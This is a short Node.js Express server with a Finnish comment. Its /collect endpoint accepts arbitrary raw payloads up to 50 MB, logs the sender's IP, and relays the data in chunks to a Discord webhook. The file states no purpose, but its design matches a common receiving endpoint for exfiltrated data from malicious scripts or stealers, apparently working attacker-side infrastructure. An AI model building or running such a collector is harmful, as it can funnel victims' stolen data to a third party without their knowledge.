const express = require('express');
const app = express();

// Tärkeää: käsitellään raaka teksti ja URL-enkoodattu data
app.use(express.text({ limit: '50mb', type: '*/*' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';

app.post('/collect', async (req, res) => {
  const payload = typeof req.body === 'string' ? req.body : req.body?.payload || '';
  const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
  const ts = new Date().toISOString();

  if (!payload || payload.length < 5) {
    return res.status(400).json({ error: 'empty' });
  }

  console.log(`[${ts}] ${ip} — ${payload.length}B`);

  if (DISCORD_WEBHOOK) {
    const chunks = [];
    for (let i = 0; i < payload.length; i += 1900) {
      chunks.push(payload.substring(i, i + 1900));
    }

    for (let i = 0; i < chunks.length; i++) {
      try {
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `\`\`\`\n[${ts}] ${i + 1}/${chunks.length} | IP: ${ip}\n${chunks[i]}\n\`\`\``
          })
        });
      } catch (e) {
        console.error('Discord error:', e.message);
      }
    }
  }

  res.json({ status: 'ok', size: payload.length, time: ts });
});

app.get('/', (req, res) => {
  res.send('🟢 Online');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Running on :${PORT}`));
